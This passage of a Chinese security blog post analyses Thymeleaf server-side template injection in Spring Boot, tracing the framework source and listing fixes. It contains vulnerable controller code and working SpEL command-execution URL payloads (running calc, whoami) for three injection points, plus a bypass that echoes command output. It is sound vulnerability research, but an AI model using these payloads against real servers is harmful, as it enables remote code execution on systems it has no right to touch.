<p>循环遍历所有视图解析器解析视图，解析成功则返回，可以看到右下角这里有5个视图解析器</p>
<p>本以为会在<code>ThymeleafViewResolver</code>中获取视图，实际调试发现这里在<code>ContentNegotiatingViewResolver</code>中就已经获取到了视图</p>
<blockquote>
<p><code>ContentNegotiatingViewResolver</code>视图解析器允许使用同样的数据获取不同的View，支持三种方式：</p>
</blockquote>
<ol>
<li><p>使用扩展名：</p>
<p><a target="_blank" rel="noopener" href="http://localhost:8080/employees/nego/Jack.xml">http://localhost:8080/employees/nego/Jack.xml</a><br>返回结果为XML<br><a target="_blank" rel="noopener" href="http://localhost:8080/employees/nego/Jack.json">http://localhost:8080/employees/nego/Jack.json</a><br>返回结果为JSON<br><a target="_blank" rel="noopener" href="http://localhost:8080/employees/nego/Jack">http://localhost:8080/employees/nego/Jack</a><br>使用默认view呈现，比如JSP</p>
</li>
<li><p>HTTP Request Header中的Accept：Accept 分别是<code>text/jsp</code>，<code>text/pdf</code>，<code>text/xml</code>，<code>text/json</code>和<code>无Accept请求头</code></p>
</li>
<li><p>使用参数：</p>
<p><a target="_blank" rel="noopener" href="http://localhost:8080/employees/nego/Jack?format=xml">http://localhost:8080/employees/nego/Jack?format=xml</a><br>返回结果为XML<br><a target="_blank" rel="noopener" href="http://localhost:8080/employees/nego/Jack?format=json">http://localhost:8080/employees/nego/Jack?format=json</a><br>返回结果为JSON</p>
</li>
</ol>
<p>接下来跟进到<code>ContentNegotiatingViewResolver#resolveViewName</code>方法</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195200924.png" alt="image-20240710195200924"></p>
<p><code>getCandidateViews</code>循环调用所有的ViewResolver解析视图，解析成功放到视图列表中返回。同样也会根据Accept头得到后缀并通过ViewResolver解析视图</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195405092.png" alt="image-20240710195405092"></p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195451593.png" alt="image-20240710195451593"></p>
<br>

<p>接下来进入<code>getBestView</code>，根据Accept头获取最优的视图返回</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195808153.png" alt="image-20240710195808153"></p>
<p>最终返回的是<code>ThymeleafView</code></p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200007899.png" alt="image-20240710200007899"></p>
<hr>
<h3 id="视图渲染"><a href="#视图渲染" class="headerlink" title="视图渲染"></a>视图渲染</h3><p>下一步是调用<code>render</code>方法</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200308152.png" alt="image-20240710200308152"></p>
<p>进入<code>ThymleafView#render</code>，接下来就是调用<code>renderFragment</code>**，这里就是漏洞触发的关键点之一了</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200453736.png" alt="image-20240710200453736"></p>
<p>该方法在后面首先判断<code>viewTemplateName</code>是否包含<code>::</code>，若包含则获取解析器</p>
<p>然后调用<code>parseExpression</code>方法将<code>viewTemplateName</code>（也就是Controller中最后return的值)构造成片段表达式<code>~&#123;&#125;</code>）并解析执行</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200843665.png" alt="image-20240710200843665"></p>
<p>因为我们这边的 viewTemplateName 为 user&#x2F;en&#x2F;welcome，所以不会进入<code>parseExpression</code></p>
<hr>
<h2 id="回显原理"><a href="#回显原理" class="headerlink" title="回显原理"></a>回显原理</h2><p>这种回显的本质其实是 <strong>throw 某个会包含表达式执行结果的异常</strong>，而在低版本的 springboot (&lt;&#x3D; 2.2) 中, <code>server.error.include-message</code> 的默认值为 <code>always</code>，这使得默认的 500 页面会显示异常信息</p>
<p>但是在高版本的 springboot (&gt;&#x3D; 2.3) 中, 上述选项的默认值变成了 <code>never</code>, 那么 500 页面就不会显示任何异常信息，所以这种回显形式还是会有一定的局限性</p>
<hr>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="templatename"><a href="#templatename" class="headerlink" title="templatename"></a>templatename</h2><p>漏洞代码：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token string">"user/"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"/welcome"</span><span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>打入payload：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>path<span class="token operator">?</span>lang<span class="token operator">=</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>calc<span class="token punctuation">.</span>exe<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>PS：因为这里最后return的值为<code>user/__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()&#125;__::.x/welcome</code>，无论我们payload如何构造最后都会拼接<code>/welcome</code>，所以根据前面分析即使不加<code>.x</code>依然可以触发命令执行</p>
<p>然后继续前面的分析，这样就进入了<code>parseExpression</code></p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710201426798.png" alt="image-20240710201426798"></p>
<p>在<code>StandardExpressionParser#parseExpression</code>中</p>
<p>通过<code>preprocess</code>进行预处理，预处理根据该正则<code>\\_\\_(.*?)\\_\\_</code>提取<code>__xx__</code>间的内容</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202246428.png" alt="image-20240710202246428"></p>
<p>获取<code>expression</code></p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202506931.png" alt="image-20240710202506931"></p>
<p>可以看到这里返回的expression已经是一个SPEL表达式了</p>
<p>最终调用<code>execute</code>方法，执行表达式</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202537749.png" alt="image-20240710202537749"></p>
<p>于是就弹出计算器了，同时抛出错误</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202804970.png" alt="image-20240710202804970"></p>
<p>所以这个漏洞的本质是<strong>SPEL表达式执行</strong></p>
<hr>
<h2 id="selector"><a href="#selector" class="headerlink" title="selector"></a>selector</h2><p>对于<code>~&#123;templatename::selector&#125;</code>，因为前面是在templatename的位置注入表达式，那么我们同样也可以在selector处进行注入</p>
<p>漏洞代码：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/fragment"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">fragment</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> section<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token string">"welcome :: "</span> <span class="token operator">+</span> section<span class="token punctuation">;</span> <span class="token comment">//fragment is tainted</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>payload：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>fragment<span class="token operator">?</span>section<span class="token operator">=</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>calc<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>其实这里也可以不需要<code>.x</code>和<code>::</code>也可触发命令执行</p>
<p>值得注意的是，templatename和selector这两个地方的注入点不同会导致有无回显的差别，即最后抛出异常，templatename是存在结果回显的而找不到selector不存在结果回显</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710204032791.png" alt="image-20240710204032791"></p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710204046819.png" alt="image-20240710204046819"></p>
<p>原因是最终抛出 <code>TemplateInputException</code> 异常的时候携带的是 template，也就是 <code>::</code> 前面的内容，并没有带出 selector，详情看下面的回显分析</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710205345656.png" alt="image-20240710205345656"></p>
<hr>
<h2 id="URI-path"><a href="#URI-path" class="headerlink" title="URI path"></a>URI path</h2><p>漏洞代码：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//returns void, so view name is taken from URI</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>payload：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>doc<span class="token operator">/</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>calc<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>前面提过，在<code>applyDefaultViewName</code>方法处对当前ModelAndView做判断，如果为null则进入defalutViewName部分处理，将URI path作为mav的值即作为视图名称</p>
<p>所以我们直接在<code>&#123;document&#125;</code>位置传入payload，能直接弹计算器</p>
<p>但是当我们尝试执行 whoami 时，并没有产生回显，而是原封不动输出了我们的payload</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710211509566.png" alt="image-20240710211509566"></p>
<p>这是因为这个controller没有返回值，也不能有返回值，否则就不会调用<code>applyDefaultViewName</code>设置，如果我们的controller改成下面这样，将不会导致代码执行</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"welcome"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="构造回显"><a href="#构造回显" class="headerlink" title="构造回显"></a>构造回显</h3><p>templatename部分可控，没回显的原因在于defaultView中对URI path的处理，为了解决这个问题，我们可以在payload的最后加两个<code>.</code></p>
<p>payload：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>doc<span class="token operator">/</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>whoami<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>需要注意的是<code>::</code>必须放在后面，放在前面虽然可以执行命令，但是没有回显，类似于templatename和selector的区别</p>
<p>造成这个问题的地方在<code>StandardExpressionParser#parseExpression</code>，<strong>在<code>preprocess</code>预处理结束后</strong>还会再走<code>Expression.parse</code>进行一次解析，这里如果解析失败则不会回显</p>
<p>现在来使用<code>::.x</code>结尾的payload：</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711022303079.png" alt="image-20240711022303079"></p>
<p>可以看到这里<code>::</code>后面是没有内容的，因此解析后expression的值为null，所以最终会抛出<code>IllegalArgumentException</code>异常，携带的异常信息只包含了我们输入的内容, 并没有命令的回显</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711103449462.png" alt="image-20240711103449462"></p>
<br>

<p>而使用<code>::..</code>结尾的payload：</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711022515345.png" alt="image-20240711022515345"></p>
<p>这一步是正常解析出了expression，值变成 FragmentExpression</p>
<p>之后返回到 <code>ThymeleafView#renderFragment</code> 方法, 往下会将表达式执行结果作为 templateName，并提取出 <code>::</code> 后面的内容作为 selector</p>
<p>然后调用 <code>viewTemplateEngine.process()</code></p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711104350408.png" alt="image-20240711104350408"></p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711105057414.png" alt="image-20240711105057414"></p>
<p>跟进 <code>TemplateManager#resolveTemplate</code></p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711105238882.png" alt="image-20240711105238882"></p>
<p>templateResolver 负责在 classpath (prefix) 下依据 template (name) 和 suffix 寻找对应的模板文件</p>
<p>这里肯定是找不到的, 所以会抛出 TemplateInputException 异常, 但是这个异常会带出 tempate 名称并最终显示在 500 页面中, 因此达到了回显的效果</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711105820284.png" alt="image-20240711105820284"></p>
<hr>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>现在分析一下为什么<code>::.x</code>会被去掉：</p>
<p>在分析<code>URI PATH</code>这种方式能获取<code>ModelAndView</code>的原因时，我们分析过在<code>applyDefaultViewName</code>中获取URI Path作为<code>ModelAndView</code>的name，这个操作在<code>DefaultRequestToViewNameTranslator#getViewName</code>中完成</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024115948.png" alt="image-20240711024115948"></p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024130741.png" alt="image-20240711024130741"></p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024213451.png" alt="image-20240711024213451"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getViewName</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token class-name">String</span> lookupPath <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>urlPathHelper<span class="token punctuation">.</span><span class="token function">getLookupPathForRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token class-name">HandlerMapping</span><span class="token punctuation">.</span><span class="token constant">LOOKUP_PATH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>prefix <span class="token operator">+</span> <span class="token function">transformPath</span><span class="token punctuation">(</span>lookupPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>suffix<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>getLookupPathForRequest</code>仅仅获取了请求的地址并没有对后面的<code>.x</code>做处理，处理主要是在<code>transformPath</code>中完成的</p>
<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024400363.png" alt="image-20240711024400363"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Nullable</span>
<span class="token keyword">protected</span> <span class="token class-name">String</span> <span class="token function">transformPath</span><span class="token punctuation">(</span><span class="token class-name">String</span> lookupPath<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token class-name">String</span> path <span class="token operator">=</span> lookupPath<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stripLeadingSlash <span class="token operator">&amp;&amp;</span> path<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token constant">SLASH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		path <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stripTrailingSlash <span class="token operator">&amp;&amp;</span> path<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token constant">SLASH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		path <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stripExtension<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		path <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">stripFilenameExtension</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">SLASH</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>separator<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		path <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token constant">SLASH</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>separator<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> path<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024501146.png" alt="image-20240711024501146"></p>
<p><code>stripFilenameExtension</code>会去除最后一个<code>.</code>后的内容，所以可以通过下面的方式绕过</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>doc<span class="token operator">/</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token function">assadasd</span><span class="token punctuation">.</span>asdas<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>总之就是让<code>::</code>后面有内容才能实现回显</p>
<hr>
<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><h2 id="配置ResponseBody或RestController注解"><a href="#配置ResponseBody或RestController注解" class="headerlink" title="配置ResponseBody或RestController注解"></a>配置ResponseBody或RestController注解</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@ResponseBody</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//returns void, so view name is taken from URI</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>配置了<code>ResponseBody</code>注解后，在<code>applyDefaultViewName</code>中<code>ModelAndView</code>是<code>Null</code>而非<code>ModelAndView</code>对象，所以<code>hasView()</code>会导致异常，不会设置视图名</p>
<p>原因是设置了<code>ResponseBody</code>注解后，handler返回的是<code>RequestResponseBodyMethodProcesser</code>，所以这里会调用它的<code>handleReturnValue</code>，设置了<code>RequestHandled</code>属性为True</p>
<p>此方法也适用于<code>templatename</code>，在设置了<code>RequestHandled</code>属性后，<code>ModelAndView</code>一定会返回Null</p>
<p>这样 spring 框架就不会将其解析为视图名，而是直接返回，不再调用模板解析</p>
<hr>
<h2 id="通过redirect"><a href="#通过redirect" class="headerlink" title="通过redirect:"></a>通过redirect:</h2><blockquote>
<p>根据springboot定义，如果名称以<code>redirect:</code>开头，则不再调用<code>ThymeleafView</code>解析，调用<code>RedirectView</code>去解析<code>controller</code>的返回值</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/safe/redirect"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token string">"redirect:"</span> <span class="token operator">+</span> url<span class="token punctuation">;</span> <span class="token comment">//FP as redirects are not resolved as expressions</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h2 id="方法参数中设置HttpServletResponse-参数"><a href="#方法参数中设置HttpServletResponse-参数" class="headerlink" title="方法参数中设置HttpServletResponse 参数"></a>方法参数中设置HttpServletResponse 参数</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析</p>
<hr>
<h1 id="其它姿势"><a href="#其它姿势" class="headerlink" title="其它姿势"></a>其它姿势</h1><h2 id="位置"><a href="#位置" class="headerlink" title="::位置"></a>::位置</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">::</span><span class="token function">__</span>$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>open<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>a<span class="token operator">%</span><span class="token number">20</span>calculator<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

